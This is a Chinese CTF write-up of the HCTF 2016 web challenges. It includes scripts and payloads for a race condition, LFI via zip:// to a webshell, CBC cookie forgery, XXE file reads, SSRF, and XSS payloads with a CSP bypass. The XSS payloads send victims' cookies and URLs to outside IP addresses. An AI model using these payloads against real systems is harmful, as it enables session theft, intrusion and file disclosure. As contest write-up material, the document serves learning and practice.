

#HCTF-2016 WEB WRITES UP PARTLY

###by Hence Zhang@lancet 

###**WEB-1**      
 2099年的flag

构造iphone(***只能是iphone***)的ios99的user-agent即可获取flag，如下：

>User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 99_1_4 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B350 Safari/8536.25

参考UA链接：

http://www.webapps-online.com/online-tools/user-agent-strings/dv/operatingsystem51849/ios

最终flag：

	hctf{h77p_He4dEr_50_E4sy}

###**WEB-2**  

encore time

没啥意思，主办方丧心病狂的比赛调研，填完后返回flag。

最终flag：

	hctf{7hank_y0u_f0r_your_p4rt1cip4tion}
###**WEB-3** 

RESTFUL

访问index页面会发出一个XHR请求(直接访问会返回500错误XD)，然后根据返回的提示：

>{"message":"\"Please <PUT> me some <money> more than <12450>!\""}

构造PUT请求，并把money通过伪静态URL传参的方式传递，即可返回flag。

 ![1](jpg\1.jpg)

最终flag：

	hctf{Do_you_know_12450?}
###**WEB-4**

giligili

没什么技巧，耐心分析调试即可。
在调试的过程得到具体的函数可以一点点还原代码：
Check函数还原如下：
```javascript
function real_check(){
try {		

substring = _[$[6]] // substring
tmp_int = parseInt(btoa(answer[substring](0, 4)), 32);
console.log("init_seed:"+tmp_int) // hctf作为随机种子。

h = new MersenneTwister(tmp_int);

random = _[$[""+ +[]]]
charCodeAt = _[0x4728122]
value_99 = (""+{})[charCodeAt](0xc); 
e = h[random]()* value_99

console.log('e = '+e)

// h.mti = 2
for(var _1=0; _1<h.mti; _1++) { e ^= h.mt[_1]; }

l = new MersenneTwister(e), v = true;
l.random(); 
l.random(); 
l.random();

o = answer.split("_"); // o数组是输入按下划线符号分割

i = l.mt[~~(h.random()*$[0x1f])%0xff];
toString = _[$[$.length/2]]
s = ["0x" + i[toString](0x10), "0x" + e[_[$[$.length/2]]](0o20).split("-")[1]];
//s = ["0x-1c676de5", "0xundefined"]
tmp_eval = this[_[$[42]]]
hex_str = _[$[31]] // function (_9) { var _8 = []; for (var _a = 0, _b = _9.length; _a < _b; _a++) { _8.push(Number(_9.charCodeAt(_a)).toString(16)); } return "0x" + _8.join(""); } // hex 

e =- (tmp_eval(hex_str(o[1])) ^ s[0]);  // 0x697a "Ez"
if (-e != $[21]) return false; // 调试得到$[21]和s[0]的值，可以推出o[1]应该是Ez

e ^= (tmp_eval(hex_str(o[2])) ^ s[1]);  //0x623f48bb "y0up"  同理o[2]是y0up
if (-e != $[22]) return false; 

e -= 0x352c4a9b;
t = new MersenneTwister(Math.sqrt(-e));
h.random();
a = l.random();
t.random();
y = [ 0xb3f970, 0x4b9257a, 0x46e990e ].map(function(i) { return $[_[$[40]]](i)+ +1+ -1- +1; });
// y = [1,2,4]
o[0] = o[0].substring(5); // cut hctf{
o[3] = o[3].substring(0, o[3].length - 1); // cut }  hctf{xxx_xxx_xxx_xxx}
u = ~~~~~~~~~~~~~~~~(a * i); 
if (o[0].length > 5) return false;

str_mult = _[$[23]] // function (_c, _d) { var _e = ""; for(var _f=0; _f<_d; _f++) { _e += _c; } return _e; }  str_mult
a = parseInt(str_mult("1", Math.max(o[0].length, o[3].length)), 3) ^ eval(hex_str(o[0])); 
// o[3].length=11 o[0]= "h3r3" 这里暴力得到o[3]长度11 o[0]为h3r3
r = (h.random() * l.random() * t.random()) / (h.random() * l.random() * t.random());
e ^= ~r;
r = (h.random() / l.random() / t.random()) / (h.random() * l.random() * t.random());
e ^= ~~r;

a += hex_str(o[3].substring(o[3].length - 2)).split("x")[1]; // 

if (parseInt(a.split("84")[1], $.length/2) != 0x4439feb) return false;  // int('783f3f',25) == 0x4439feb == 'x??'
//整数a按84切割后25进制是0x4439feb，得到十六进制是783f3f，得到最末2字符是？？ 
d = parseInt(a, 16) == "65531" + o[3].charCodeAt(o[3].length - 3).toString(16) + "538462015";  // d == '0x64'  
// "6553164538462015"  a =  0x17481184783f3f
  // 这里得到a真实值 
i = 0xffff;
n = (p = (f = str_mult(o[3].charAt(o[3].length - 4), 3)) == o[3].substring(1, 4)); 
// 这是和后面的substring(5,8)可以得到1到3和5到7下标的字符均相同
g = 3;
t = str_mult(o[3].charAt(3), 3) == o[3].substring(5, 8) && o[3].charCodeAt(1) * o[0].charCodeAt(0) == 0x2ef3 ; //对0x2ef3分解，得到两个符应该是 'w' * 'e'
h = ((31249*g) & i).toString(16); //  6e33 --- "n3" o[3]中去掉相同字符剩下n3

i = hex_str(o[3].split(f).join("").substring(0, 2)).split("x")[1]; 
// o[3] = neee3eeed?? 综合得到o[3]
s = i == h;
return (p & t & s & d) === 1 || (p & t & s & d) === true;
} catch (e) {
console.log(e);
return false;
}
}
```
最终flag：
hctf{wh3r3_iz_y0ur_neee3eeed??}

这题是明月表哥做的，我找到类似的题目，但是弄了半天没整出来QAQ。

###**WEB-5**

兵者多诡

home.php的fd参数存在LFI漏洞，一番试探后可知基本逻辑大致如下：

>include($fp.'.php');

而且题目可以直接上传图片，但是上传之后，无论什么文件都会被重命名成一串MD5，不能够直接访问获取shell，但是如果通过LFI的话，后面会加上'.php'。可以利用php伪协议中的zip://来getshell。

把准备好的webshell用zip压缩后上传，然后通过如下方式访问:

>/home.php?fp=zip:///var/www/html/uploads/7397f1cbd5bb072d7095dbe8b9f88019674f0898.png%23222

注意#号要使用url编码。getshell后可获取flag。

最终flag：

	hctf{Th1s_1s_e4sY_1s_n0T_1t?}
###**WEB-6**

必须比香港记者还要快

先-1s为敬。

通过域名changelog以及空的.git文件夹，脑洞到README.md（脑洞链：changelog版本控制-->可能和git有关的-->git中一般把changelog放README中）。README.md中内容如下：


># 跑得比谁都快
>## ChangeLog 的故事
>## 这里是加了.git之后忘删的README.md  XD by Aklis
>## ChangeLog
>- 2016.11.11
>  完成登陆功能，登陆之后在session将用户名和用户等级放到会话信息里面。
>  判断sessioin['level']是否能在index.php查看管理员才能看到的**东西**。
>  XD
>  -
>- 2016.11.10
>   老板说注册成功的用户不能是管理员，我再写多一句把权限降为普通用户好啰。
>- 2016.10
>    我把注册功能写好了

通过以上可知两点：1.注册的用户在某一阶段为admin权限；2.在注册完用户后会对用户进行降权。由此可知本题考查的是条件竞争。

若要使得我们的用户获取flag，则要求程序运行按如下步骤进行：

	注册admin-->admin登录成功-->admin降权
我们写两个脚本，一个注册，一个登录，控制一下运行流程即可。脚本如下：

***register.py***

```python
from http import http
import urllib
import time
#-*- coding:utf-8 -*-

headers = {'Cookie':'PHPSESSID=ea6dihviip7pdsf0fqcrq8g8j7'}
for i in range(0,1000):
           print 		http('post','changelog.hctf.io',80,'/register.php','username=adminjjj%s&password=haozi&gogogo=%s&level=1'%(str(i),'%E8%8B%9F%21'),headers)
           print str(i)+' : 	'+http('get','changelog.hctf.io',80,'/index.php','',headers)
           time.sleep(2)
```
***login.py***

```python
from http import http
import sys
headers = {}
j = 0
for i in range(10000):

print http('post','changelog.hctf.io',80,'/login.php','username=adminjjj%s&password=haozi&gogogo=%s'%(str(j),'%E8%8B%9F%21'),headers)
tmp = http('get','changelog.hctf.io',80,'/index.php','',headers)
print tmp
headers = {}
if 'zero' in tmp:
    print str(j)+":"+'fail'
    j += 1
elif 'redirect' in tmp:
    pass
else:
    print 'ok'
    sys.exit()
```

跑了大概10min左右获取到flag。

最终flag：

	hctf{faster_than_everyone}

###**WEB-7**

guestbook

首先一上来有个code验证的地方：

>substr(md5($code),0,4) =='b47d'

算一下能够碰撞的概率1/16^4，当然了，不可能每次都算一遍。于是，我们先随机算10W的hash，这样有很大情况能够碰撞上，如果碰撞失败，refresh即可，直接上脚本：

***gen_hash.py***

```python
import hashlib
res = ''
for i in range(100000):
    tmp = hashlib.md5(str(i)).hexdigest()
    res += str(i)+'|'+tmp[0:4]+"|"+tmp+'\r\n'
open('res.txt','w').write(res)
```

***hash_coll.py***

```python
from http import http
headers = {'Cookie': 'PHPSESSID=6bfu9p3lj2chna498d8pf66sp2'}
my_hash = {}
lines = open('res.txt').readlines()
for line in lines:
tmp = line[:-2].split('|')
my_hash[tmp[1]] = tmp[0]+'|'+tmp[2]

def get_code():
tmp = http('get','guestbook.hctf.io',80,'/index.php','',headers)
return 		tmp[tmp.find('substr(md5($code),0,4)')+26:tmp.find('substr(md5($code),0,4)')+30]

def search_code(code):
if(my_hash.has_key(code)):
    print 'find'
    return my_hash[code].split('|')[0]
else:
    print 'retry'        
    return search_code(get_code())

code = get_code()
real_code =  search_code(code)
print real_code
msg = raw_input('msg#')
```

然后，提交的message为：

><scriscriptpt>window.locatioonn.href="http://59.110.54.124:8080/index.php?a="+document.URL+"|"+document.cookie</scscriptript>

需要注意的地方是，这里script和on会被replace成空字串，用’scriscriptpt‘和’oon'这样的字符串就可以绕过。最后可以获得返回的url和cookie。使用该cookie访问该url即可获得最终的flag。因为xss bot 好像关掉了，flag也没记下来，就这样子把：

 ![3](jpg\3.jpg)

最终flag：

	hctf{我忘了记下来了XD}
###**WEB-8**

secret area

这题我个人感觉我的方法是可以的，而且我用自己账号测试的时候是成功的，但是貌似xss bot给每个人分配的时间有限，最后试了很多次，还是没能get到flag。

首先我们可以看到header中带的CSP策略：

>Content-Security-Policy: default-src 'self'; script-src http://sguestbook.hctf.io/static/ 'sha256-n+kMAVS5Xj7r/dvV9ZxAbEX6uEmK+uen+HZXbLhVsVA=' 'sha256-2zDCsAh4JN1o1lpARla6ieQ5KBrjrGpn0OAjeJ1V9kg=' 'sha256-SQQX1KpZM+ueZs+PyglurgqnV7jC8sJkUMsG9KkaFwQ=' 'sha256-JXk13NkH4FW9/ArNuoVR9yRcBH7qGllqf1g5RnJKUVg=' 'sha256-NL8WDWAX7GSifPUosXlt/TUI6H8JU0JlK7ACpDzRVUc=' 'sha256-CCZL85Vslsr/bWQYD45FX+dc7bTfBxfNmJtlmZYFxH4=' 'sha256-2Y8kG4IxBmLRnD13Ne2JV/V106nMhUqzbbVcOdxUH8I=' 'sha256-euY7jS9jMj42KXiApLBMYPZwZ6o97F7vcN8HjBFLOTQ=' 'sha256-V6Bq3u346wy1l0rOIp59A6RSX5gmAiSK40bp5JNrbnw='; font-src http://sguestbook.hctf.io/static/ fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'

可以看到script-src基本上完全被禁了，然后看到有上传头像的地方，估计正规做法是需要利用头像上传的。这里介绍我的做法。

把页面都翻了一遍，发现404页面处有一个有意思的跳转：

><script>
>function redirect(){ 
>window.location.href='/index.php'
>}
>window.onload = function(){
>setTimeout(redirect, 3000)
>}
></script>

他的跳转地址是通过referer来生成的，如果我们构造这样的referer：

>http://163.44.155.179/index2.php/'+document.cookie+document.URL;//

就能使得最终404页面的代码变成这样：

><script>
>function redirect(){ 
>window.location.href='http://163.44.155.179/index2.php/'+document.cookie+document.URL;//
>}
>window.onload = function(){
>setTimeout(redirect, 3000)
>}
></script>

这就是最后盗cookie的关键代码。

然后在CSP绕过这一块，google一番后发现如下payload:

><META HTTP-EQUIV="refresh" COONNTENT="0; url=data:text/html;base64,XXXXX>

这种形式可以使得浏览器执行你的js代码，但浏览器并不允许data直接访问cookie，所以必须结合上述的方法，但上述404的referer反射型xss的触发条件是要构造一个malicious的referer，所以我们先通过跳转到那个malicious的referer的网址，再跳转会最终的404页面，触发xss。话不多说，直接上py脚本。

***CSP_bypass.py***

```python
from http import http
import urllib
import hashlib
import random
from base64 import b64encode

headers_aaaa = {'Cookie':'PHPSESSID=hntflqiue7i9qao2ip23jbmle7'}

def get_main(headers):
	return http('get','sguestbook.hctf.io',80,'/user.php','',headers)

def send_msg(user,headers,msg):
	return 	http('post','sguestbook.hctf.io',80,'/submit.php','to=%s&message=%s'%(user,urllib.quote(msg)),headers)
r = hashlib.md5(str(random.randint(1,10000000))).hexdigest()
payload = 		'''<script>document.location="http://163.44.155.179/index2.php/\'+document.cookie+document.URL;//";</script>'''
payload = b64encode(payload)
print 'data:text/html;base64,'+payload
payload = '<META HTTP-EQUIV="refresh" COONNTENT="0; url=data:text/html;base64,' + payload +'">'

for i in range(1):
    send_msg('haozi14',headers_aaaa,r+payload)
```
服务器端的脚本为：

><script>
>window.location.href = "http://sguestbook.hctf.io/xxx.php";
></script>

最终可在服务器的日志中捕获到cookie：

 ![4](jpg\4.jpg)

但是并没有什么卵用，最后一点点测试后，发现是404页面的settimeout的问题，如果延时在2000ms以内，是可以收到admin请求的。但我问了管理大大后发现服务器10s刷新一次，所以可能还是对每个payload的运行时间的问题。

虽然没拿到flag，但测试是成功的，而且还和dalao们学到了很多黑魔法ORZ。

最终flag：

	hctf{别看我，我没flag}

###**WEB-9**

大图书馆的牧羊人

这题有点坑，一开始有.git泄露，好多人拿到源码了，变成审计题了。但后来又给删了，这让孤军奋战的web dog怎么live？

不多说，直接拿着v师傅给的代码审计，直接定位到username的cookie加密算法：

```php
function encrypt($string) {
	$密钥 = "23333";
	$algorithm = 'rijndael-128';
	$key = md5($密钥, true);
	$iv_length = mcrypt_get_iv_size( $algorithm, MCRYPT_MODE_CBC );
	$iv = mcrypt_create_iv( $iv_length, MCRYPT_RAND );
	$encrypted = mcrypt_encrypt( $algorithm, $key, $string, 		MCRYPT_MODE_CBC, $iv );
	$result = urlsafe_b64encode( $iv . $encrypted );
	return $result;
}
function urlsafe_b64encode($string) {
   $data = base64_encode($string);
   $data = str_replace(array('+','/','='),array('-','_',''),$data);
   return $data;
}
```
一开始没源码时就怀疑这个username的cookie值了，火日dalao说：
>***看见这种cookie就知道是什么套路，一般加密里面能破的就是cbc模式的***

我还是太菜了。然后我们伪造一个cookie：

>username=tR5Ot6BBbfww7al5sG9qn99nNq1BWOuOEyX9ubz66Ak

进入manager页面上传zip文件即可，zip文件中放一个php webshell，访问之可获取flag。示例地址如下：

>http://library.hctf.io/uploads/b.zip/b.php

最终flag：

	hctf{Serena_is_the_leading_role}

###**WEB-10**
魔法禁书目录

用之前的套路去测试，发现给cookie加密的秘钥变了，于是先尝试去爆破他。边爆破边深入看decrypt的代码，发现：
	$result = rtrim($result, "\0");	
	return $result;

cbc加密时候如果不够128位会有0x00来填充，decrypt处会把0x00给过滤掉。于是我们可以构造这样的用户名：

>username=admin%00%00....(最多15个0x00，这是题目限制)

最后decrypt的结果都是admin。接着我们又发现login页面处一个有趣的session设置逻辑：

```php
if (isset($_COOKIE['username']) &&decrypt($_COOKIE['username'])!=="") {
$_SESSION['username'] = decrypt($_COOKIE['username']);
header("Location: /index.php");
exit();
}
```

也就是说cookie中username的value不空时，将session的username设置为对cookie中username decrypt后的值。也就是说我们先从login.php登陆我们admin%00...的账号,然后再访问一次login.php,这样子我们就能获取管理员权限了。

然后又到了上传的页面，这次上传之后，发现php页面没有解析，尝试了以下几种姿势都没有成功：

>1..htaccess增加解析类型（看了下phpinfo，貌似rewrite没开QAQ）；

>2.zip解压时的symbol link的问题，以前facebook就曾经有这样的洞，但是很可惜也没成功；

最后在v师傅的指点下，发现了XXE，顺便看了下libxml的版本，我去，这是有多老的so。。。

最终构造的一个xml文件如下所示：

><!DOCTYPE ANY[
><!ENTITY xxe1 SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">
><!ENTITY xxe2 SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/login.php">
><!ENTITY xxe3 SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/logout.php">
><!ENTITY xxe4 SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/manager.php">
><!ENTITY xxe5 SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/register.php">
><!ENTITY xxe6 SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/phpinfo.php">
><!ENTITY xxe7 SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php">
>]>

><navLabel><text>&xxe1;||||;&xxe2;||||;&xxe3;||||;&xxe4;||||;&xxe5;||||;&xxe6;||||;&xxe7;||||;</text></navLabel>

读取到你想要的文件的源码（顺便又把源码脱了一遍）。

最终的返回大概是这样子的：

 ![5](jpg\5.jpg)

解码base64可得flag。

最终flag：

	hctf{Lillie_is_comming}
###**WEB-11**

SSRF 且限制了域名

使用xip.io过掉限制，payload为

[http://www.127.0.0.1.xip.io](http://www.127.0.0.1.xip.io)

返回图片位置base64解码得到flag

（题目现在下线了，比赛时也没来得及看，明月表哥的WP里摘录）

###**WEB-12**

AT feild2

（火日dalao说是memcache，session注入，题目下线没办法浮现了）

###**WEB-13**

你没走过的套路

